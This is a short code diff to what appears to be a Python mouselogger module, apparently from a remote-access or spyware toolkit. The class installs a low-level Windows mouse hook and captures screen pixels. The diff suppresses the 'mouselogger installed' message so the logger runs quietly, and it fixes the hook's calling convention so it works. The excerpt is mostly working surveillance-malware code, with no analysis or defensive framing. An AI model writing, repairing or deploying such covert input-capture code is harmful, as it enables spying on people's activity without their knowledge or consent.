@@ -118,7 +118,8 @@ class MouseLogger(threading.Thread):
 
 	def run(self):
 		if self.install_hook():
-			print "mouselogger installed"
+			#print "mouselogger installed"
+			pass
 		else:
 			raise RuntimeError("couldn't install mouselogger")
 		msg = MSG()
@@ -175,7 +176,7 @@ class MouseLogger(threading.Thread):
 		return pixels.raw, height, width
 
 	def install_hook(self):
-		CMPFUNC = CFUNCTYPE(c_int, c_int, c_int, POINTER(c_void_p))
+		CMPFUNC = WINFUNCTYPE(c_int, c_int, c_int, POINTER(c_void_p))
 		self.pointer = CMPFUNC(self.hook_proc)
 		self.hooked = self.lUser32.SetWindowsHookExA(WH_MOUSE_LL, self.pointer, kernel32.GetModuleHandleW(None), 0)
 		if not self.hooked:
